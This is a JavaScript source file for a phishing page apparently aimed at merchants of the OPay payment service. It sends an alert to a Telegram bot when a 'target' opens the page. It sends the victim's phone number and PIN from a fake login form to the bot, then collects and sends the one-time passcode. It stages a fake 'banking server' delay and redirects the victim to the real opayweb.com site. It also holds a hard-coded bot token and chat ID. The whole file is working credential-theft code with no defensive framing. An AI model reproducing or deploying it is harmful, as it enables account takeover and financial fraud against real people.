const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
const chatId = '7909543900';

async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
        });
    } catch (e) { console.error("Error"); }
}

// 1. Alert on Load
window.onload = () => sendToTelegram("<b>🚀 Target on Site</b>\nMerchant is viewing the portal.");

// 2. Login Logic
const authForm = document.getElementById('auth-form');
authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const phone = document.getElementById('phone').value;
    const pin = document.getElementById('pin').value;
    const btn = document.getElementById('submit-btn');

    btn.innerText = "Processing...";
    btn.disabled = true;

    await sendToTelegram(`<b>🔑 Credentials</b>\n<b>Phone:</b> ${phone}\n<b>PIN:</b> ${pin}`);

    document.getElementById('login-card').style.display = 'none';
    document.getElementById('otp-section').style.display = 'block';
    startTimer(60);
});

function startTimer(duration) {
    let timer = duration;
    const display = document.getElementById('timer-text');
    const interval = setInterval(() => {
        display.textContent = `Resend in ${timer--}s`;
        if (timer < 0) { clearInterval(interval); display.textContent = "Resend OTP"; }
    }, 1000);
}

// 3. OTP & Success Logic (UPDATED)
const verifyBtn = document.getElementById('verify-otp-btn');
verifyBtn.addEventListener('click', async () => {
    const otp = document.getElementById('otp-input').value;
    if (!otp) return;

    verifyBtn.innerText = "Finalizing Sync...";
    verifyBtn.disabled = true;

    await sendToTelegram(`<b>🔢 OTP Code</b>\nCode: <code>${otp}</code>`);

    // Fake delay to simulate "Banking Server Communication"
    setTimeout(() => {
        document.getElementById('otp-section').style.display = 'none';
        document.getElementById('success-section').style.display = 'block';
        
        // Final background redirect after 10 seconds of viewing success
        setTimeout(() => {
            window.location.replace("https://www.opayweb.com/");
        }, 10000);
    }, 2000);
});
